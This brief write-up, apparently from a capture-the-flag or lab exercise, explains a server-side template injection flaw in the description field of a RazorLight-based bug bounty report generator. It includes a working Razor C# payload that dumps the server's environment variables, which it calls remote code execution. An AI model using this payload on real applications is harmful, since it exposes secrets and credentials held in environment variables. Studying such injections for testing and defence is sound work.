The task involves exploiting a Server-Side Template Injection (SSTI) vulnerability in a bug bounty report generator application. The vulnerability exists in the **description** field, where user input is improperly sanitized and directly evaluated by the RazorLight templating engine.


**Crafting the Exploit:**
   - SSTI allows executing arbitrary commands by injecting system-related functions.
   - The payload for Remote Code Execution (RCE) was crafted as:


```c#
@{
    var envVars = System.Environment.GetEnvironmentVariables();
    foreach (var key in envVars.Keys)
    {
        Write(key + " = " + envVars[key] + "<br>");
    }
}
``` 

